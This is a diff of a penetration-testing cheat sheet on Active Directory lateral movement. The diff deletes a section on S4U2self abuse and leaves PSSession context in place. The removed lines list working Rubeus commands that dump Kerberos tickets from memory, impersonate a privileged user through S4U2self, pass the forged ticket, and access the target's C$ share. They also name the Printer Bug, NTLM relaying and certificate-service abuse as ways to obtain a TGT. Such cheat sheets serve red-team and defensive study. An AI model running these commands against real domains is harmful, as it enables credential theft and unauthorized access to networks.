@@ -3,7 +3,6 @@
 * [Check Local Admin Access](#Check-Local-Admin-Access)  
 * [Pass The Hash](#Pass-The-Hash)
   * [Overpass The Hash](#Overpass-The-Hash)
-* [S4U2self](#S4U2self)
 * [Lateral Movement Techniques](#Lateral-Movement-Techniques)
   * [PSSession](#PSSession) 
   * [PSExec](#PSExec)
@@ -169,41 +168,7 @@ $sess = new-pssession -credential $creds -computername <TARGET FQDN>
 enter-pssession $sess
 ```
 
-## S4U2self
-- Gain access to a domain computer if we have its RC4, AES256 or TGT.
-- There are means of obtaining a TGT for a computer without already having local admin access to it, such as pairing the Printer Bug and a machine with unconstrained delegation, NTLM relaying scenarios and Active Directory Certificate Service abuse
-
-#### Dump TGT
-```
-.\Rubeus.exe triage
-.\Rubeus.exe dump /luid:<LUID> /service:krbtgt
-```
-
-#### Check for user to impersonate
-```
-Get-DomainUser | ? {!($_.memberof -Match "Protected Users")} | select samaccountname, memberof
-```
-
-#### Request TGS
-- Impersonate any user except those in groups "Protected Users" or accounts with the "This account is sensitive and cannot be delegated" right.
-- Make sure they are local admin on the target machine.
-```
-.\Rubeus.exe s4u /impersonateuser:<USER> /self /altservice:cifs/<COMPUTER FQDN> /user:<COMPUTERNAME>$ /ticket:<TGT TICKET> /nowrap
-```
-
-#### Load the ticket
-```
-.\Rubeus.exe /ticket:<TICKET BASE64> /ptt
-.\Rubeus.exe /ticket:<FILE TO KIRBI FILE> /ptt
-```
- 
-#### Execute ls on the computer
-```
-ls \\<COMPOTERNAME FQDN>\C$
-```
-
 ## Lateral Movement Techniques
-
 ### PSSession
 - Uses winrm / wmi
 - Work with the `-Credential $creds` parameter.
